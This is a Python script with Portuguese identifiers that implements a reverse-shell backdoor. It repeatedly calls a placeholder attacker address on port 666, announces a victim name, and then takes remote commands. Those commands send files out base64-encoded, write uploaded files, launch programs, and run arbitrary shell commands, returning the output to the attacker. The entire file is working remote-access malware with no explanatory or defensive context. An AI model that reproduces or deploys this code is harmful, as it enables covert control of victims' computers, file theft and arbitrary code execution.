import socket, subprocess, time, os, base64 #1

nome = "DANIEL" #2

while True: #3
    try: #4
        conexao = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #5
        timeout = 60 #6
        conexao.settimeout(timeout) #7
        conexao.connect(("IP_do_atacante",666)) #8
        conexao.send(nome) #9

        while True: #10
            try: #11
                comando = conexao.recv(1024) #12
            except socket.timeout: #13
                a = conexao.send("\r") #14
                if not a: #15
                    conexao.close() #16
                    break #17
                else: #18
                    continue #19

            if not comando: #20
                raise Exception #21

            elif comando.startswith("download"): #22
                conexao.settimeout(None) #23
                nome_do_arquivo = comando.split()[1] #24
                try: #25
                    with open(nome_do_arquivo, "rb") as arquivo: #26
                        arquivo2 = arquivo.read() #27
                        conteudo = base64.b64encode(arquivo2) + "\n" #28
                    x = 0 #29
                    while x < len(conteudo): #30
                        conexao.send(conteudo[x:x+1024]) #31
                        x += 1024 #32
                except IOError: #33
                    conexao.send("\\") #34
                conexao.settimeout(timeout) #35

            elif comando.startswith("upload"): #36
                arquivo_upload = comando.split()[1] #37
                resultado = "" #38
                while True: #39
                    resultado2 = conexao.recv(1024) #40
                    resultado += resultado2 #41
                    if not resultado2: #42
                        raise Exception #43
                    elif resultado2[-1] == "\n": #44
                        break #45
                try: #46
                    conexao.settimeout(None) #47
                    with open(arquivo_upload, "wb") as arquivo: #48
                        conteudo = base64.b64decode(resultado) #49
                        arquivo.write(conteudo) #50
                    conexao.send("Upload enviado com sucesso") #51
                except IOError: #52
                    conexao.send("Falha no envio do upload") #53
                finally: #54
                    conexao.settimeout(timeout) #55

            elif comando.startswith("exec"): #56
                conexao.settimeout(None) #57
                cmd = comando.split()[1:] #58
                executado = subprocess.Popen(cmd, shell=True) #59
                time.sleep(1) #60
                if executado.poll() == None or executado.poll() == 0: #61
                    conexao.send("O arquivo foi executado") #62
                elif executado.poll() == 1: #63
                    conexao.send("Falha na execucao do arquivo") #64
                conexao.settimeout(timeout) #65

            else: #66
                conexao.settimeout(None) #67
                diretorio = os.getcwd() #68
                if comando.startswith("cd"): #69
                    try: #70
                        os.chdir(comando.split()[1]) #71
                        diretorio = os.getcwd() #72
                    except IndexError: #73
                        conexao.send(base64.b64encode(diretorio) + "\n") #74
                    except WindowsError as e: #75
                        conexao.send(base64.b64encode(e.strerror) + "\n") #76
                    else: #77
                        conexao.send("\n") #78
                else: #79
                    cmd = subprocess.Popen(comando, shell=True,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE,
                                                cwd=diretorio) #80
                    resultado = cmd.stdout.read()+ cmd.stderr.read() #81
                    conexao.sendall(base64.b64encode(resultado) + "\n") #82
                conexao.settimeout(timeout) #83

    except Exception: #84
        time.sleep(2) #85